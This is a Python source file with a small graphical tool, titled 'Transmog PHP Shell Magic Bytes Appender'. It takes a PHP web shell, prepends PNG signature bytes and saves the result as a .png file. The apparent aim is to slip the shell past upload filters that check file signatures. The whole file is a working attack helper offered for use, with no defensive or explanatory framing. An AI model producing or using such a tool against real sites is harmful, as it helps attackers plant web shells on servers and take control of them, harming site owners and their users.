import PySimpleGUI as sg
import os

def append_magic_bytes(php_shell_path):
    magic_bytes = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'  # PNG magic bytes

    with open(php_shell_path, 'rb') as file:
        php_shell_content = file.read()

    new_content = magic_bytes + php_shell_content

    # Save the new content to a file
    directory, filename = os.path.split(php_shell_path)
    new_file_path = os.path.join(directory, "modified_" + filename + ".png" )
    with open(new_file_path, 'wb') as new_file:
        new_file.write(new_content)

    sg.popup(f"Modified PHP shell saved to: {new_file_path}")

def is_png_file(file_path):
    png_magic_bytes = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'

    with open(file_path, 'rb') as file:
        file_content = file.read(8)

    return file_content == png_magic_bytes

# GUI layout
layout = [
    [sg.Text("Select PHP Shell:")],
    [sg.Input(key='-PHP_SHELL-'), sg.FileBrowse(file_types=(("PHP Files", "*.php"),))],
    [sg.Button("Append Magic Bytes"), sg.Button("Exit")]
]

# Create the window
window = sg.Window("Transmog PHP Shell Magic Bytes Appender", layout,  keep_on_top=True,
               auto_size_buttons=False,
               grab_anywhere=False,
               no_titlebar=False,
               return_keyboard_events=False,
               alpha_channel=0.9,
               use_default_focus=False,
               finalize=True)

# Event loop
while True:
    event, values = window.read()

    if event == sg.WINDOW_CLOSED or event == "Exit":
        break

    if event == "Append Magic Bytes":
        php_shell_path = values['-PHP_SHELL-']
        if php_shell_path:
            if is_png_file(php_shell_path):
                sg.popup("Cannot append magic bytes to a PNG file.")
            else:
                append_magic_bytes(php_shell_path)

# Close the window
window.close()
